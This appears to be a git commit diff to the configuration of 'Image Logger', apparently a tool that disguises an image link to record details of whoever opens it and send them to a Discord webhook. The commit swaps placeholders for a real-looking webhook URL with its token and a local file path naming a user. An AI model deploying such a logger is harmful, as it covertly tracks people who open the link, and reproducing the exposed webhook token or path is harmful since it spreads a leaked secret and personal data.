f41a6b9e917bc6386883b93ddf8bfc0ee11dda69
helloagain16 <109904396+helloagain16@users.noreply.github.com>
2023-03-02 17:28:25 +0000

    Update main.py

--- main.py
+++ main.py
@@ -12,13 +12,13 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1080903979719999539/p6KaCiHr6LQSIZNb0yvHzznB5bR8keX4ee30c1rCV7qyd6EOPcStAfeiFHS_FcUbv8Es",
+    "image": "file:///C:/Users/noora/OneDrive/Documents/eco_test.pdf", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "Eco_test", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
